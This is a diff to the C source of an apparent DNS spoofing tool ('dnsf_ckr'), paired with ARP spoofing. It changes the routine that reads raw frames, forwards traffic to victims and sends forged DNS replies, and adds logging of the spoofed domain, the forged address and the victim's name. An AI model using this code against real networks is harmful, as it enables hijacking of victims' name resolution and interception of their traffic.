@@ -1,3 +1,10 @@
+/*
+ *                              Copyright (C) 2014 by Rafael Santiago
+ *
+ * This is free software. You can redistribute it and/or modify under
+ * the terms of the GNU General Public License version 2.
+ *
+ */
 #include "netbots.h"
 #include "types.h"
 #include "arpspf.h"
@@ -48,8 +55,12 @@ void *dnsf_ckr_fakeserver_bot_routine(void *vargs) {
     dnsf_ckr_sockio_data_ctx *packets = NULL, *p;
     unsigned char *rawpkt = NULL;
     unsigned char src_mac[6];
+    char domain_name[0xff];
+    dnsf_ckr_victims_ctx *victim = NULL;
+    dnsf_ckr_hostnames_ctx *hostinfo = NULL;
     size_t rawpktsz;
     dnsf_ckr_action_t action;
+    struct in_addr spf_addr;
     while (!dnsf_ckr_should_abort()) {
         packets = dnsf_ckr_sock_read();
         if (packets != NULL) {
@@ -60,22 +71,42 @@ void *dnsf_ckr_fakeserver_bot_routine(void *vargs) {
                 if (*(p->data + 12) == 0x08 && *(p->data + 13) == 0x00) {
                     memcpy(src_mac, p->data, sizeof(src_mac));
                     rawpkt = NULL;
-                    action = dnsf_ckr_proc_ip_packet(p->data + 14, p->dsize - 14, &rawpkt, &rawpktsz, transactions, fakeserver, src_mac);
+                    victim = NULL;
+                    hostinfo = NULL;
+                    action = dnsf_ckr_proc_ip_packet(p->data + 14,
+                                                     p->dsize - 14,
+                                                     &rawpkt,
+                                                     &rawpktsz,
+                                                     transactions,
+                                                     fakeserver,
+                                                     src_mac,
+                                                     domain_name,
+                                                     sizeof(domain_name),
+                                                     &victim,
+                                                     &hostinfo);
+                } else {
+                    //  for performance reasons we won't try to handle other ether types than IP.
+                    continue;
                 }
                 switch (action) {
                     case dnsf_ckr_action_repass: //  here we only will repass and the layer-1 will be already corrected.
                         //  INFO(Santiago): don't touch... just echoing to the victim's machine what we grabbed..
                         //  ..but first we need to correct the ethernet frame.
                         action = dnsf_ckr_proc_eth_frame(p->data, p->dsize, &rawpkt, &rawpktsz, transactions);
-                        if (action == dnsf_ckr_action_none) {
+                        /*if (action == dnsf_ckr_action_none) {
                             rawpkt = p->data;
                             rawpktsz = p->dsize;
-                        }
+                        }*/
                         break;
                     case dnsf_ckr_action_spoof:
                         //  INFO(Santiago): the dns reply was already assembled by dnsf_ckr_proc_ip_packet() call and now all we need to do
                         //  is to repass it to the computer's victim which is believing that we are the DNS server..
-                        printf("dnsf_ckr INFO: spoof attempt done.\n");
+                        if (hostinfo != NULL) {
+                            spf_addr.s_addr = hostinfo->addr;
+                            printf("dnsf_ckr INFO: spoof attempt <%s:%s> to \"%s\" done.\n", domain_name, inet_ntoa(spf_addr), victim->name);
+                        } else {
+                            printf("dnsf_ckr INFO: echoing <%s> resolution to \"%s\".\n", domain_name, victim->name);
+                        }
                         break;
                     default:
                         //  INFO(Santiago): even with ethernet frame layer-3 protocol being not equals to 0x0800 (IP)
